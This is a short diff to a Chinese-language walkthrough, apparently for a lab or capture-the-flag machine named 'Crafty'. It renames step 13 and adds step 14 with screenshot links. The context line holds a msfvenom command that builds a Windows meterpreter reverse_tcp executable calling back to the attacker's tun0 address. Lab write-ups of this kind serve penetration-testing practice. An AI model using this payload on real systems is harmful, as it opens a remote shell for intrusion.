@@ -62,6 +62,12 @@ Crafty Level:Easy
 
 ![圖片](https://github.com/favorite986141/jamescao/assets/125249893/9510f70e-68d6-4bef-91e8-24460b8e0326)
 
-    13.使用msf建立一個reverse shell
+    13.使用msfvenom建立一個reverse shell
     
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4244 -f exe -o expl.exe
+    
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/e5ceb9f4-3f51-4d13-9321-191fc35e0a5a)
+
+    14.使用msf建立reverse連接
+
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/b4d6cdf8-2705-4eac-a4db-cf64ce8ae515)
